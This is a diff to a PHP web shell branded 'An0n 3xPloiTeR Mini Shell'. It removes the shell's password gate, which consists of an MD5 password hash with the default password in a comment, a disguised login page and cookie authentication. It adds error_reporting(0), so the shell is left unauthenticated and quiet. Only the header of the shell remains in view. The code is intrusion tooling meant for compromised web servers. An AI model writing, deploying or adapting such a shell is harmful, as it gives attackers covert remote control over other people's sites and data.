@@ -1,86 +1,9 @@
-<?php
-$auth_pass= "92deb3f274aaee236194c05729bfa443"; // Password in MD5
-// Default pass is password=umar
-function An0n3xPloiTeRlogin() {
-    die ('<!DOCTYPE html>
-<html>
-    <head>
-        <title>An0n 3xPloiTeR Mini Shell</title>
-        <meta charset="UTF-8">
-        <meta http-equiv="refresh" content=""> <!-- For Refreshing after ____ interval of time -->
-        <meta name="description" content="Sites description">
-        <meta name="about" content="Made By An0n 3xPloiTeR">
-        <link href="http://i66.tinypic.com/2j33a85.jpg" rel="Shortcut Icon" />
-        <meta name="description" content="For Logging into the system">
-        <style>
-            .body {
-                margin-top: 7vh;
-                text-transform: capitalize;             
-                background: black url("http://i66.tinypic.com/2j33a85.jpg");
-                background-repeat:no-repeat;
-                background-position: center;
-                background-attachment: fixed;
-                -webkit-background-size: cover;
-                -moz-background-size: cover;
-                -o-background-size: cover;
-                background-size: cover;
-            }
-            .font {
-                font-family: calibri;
-                font-size: 300%;
-                text-align: center;
-                color: white;
-            }
-            .upass {
-                margin-top: 70vh;
-                font-family: calibri;
-                font-size: 100%;
-                text-align: center;
-                color: black;
-            }
-            .input {
-                margin:0;background-color:black;border:1px solid black; 
-            }
-        </style>
-        <script language="JavaScript1.2">
-            function ejs_nodroit(){
-                alert("Login Please!");
-                return(false);
-            }
-            document.oncontextmenu = ejs_nodroit;
-        </script>
-    </head>
-
-    <body class="body">
-        <div class="font">
-            <font>login Page</font><br>
-        </div>
-        <div class="upass">
-            <form method=post>
-            <input class="input" type="password" name="pass" size="25"/>
-            </form>
-        </div>
-    </body>
-</html>');
-}
-
-function An0n3xPloiTeRsetcookie($k, $v) {
-    $_COOKIE[$k] = $v;
-    setcookie($k, $v);
-}
-
-if(!empty($auth_pass)) {
-    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass)) {
-        An0n3xPloiTeRsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
-    }
-
-    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass)) {
-        An0n3xPloiTeRLogin();
-    } }
-?>
 <!DOCTYPE html>
 <html>
 	<head>
+	<?php
+error_reporting(0);
+	?>
 		<title>Mini Shell By An0n 3xPloiTeR</title>
 		<meta charset="UTF-8" />
 		<meta name="description" content="This Mini Shell is Designed By An0n 3xPloiTeR" />
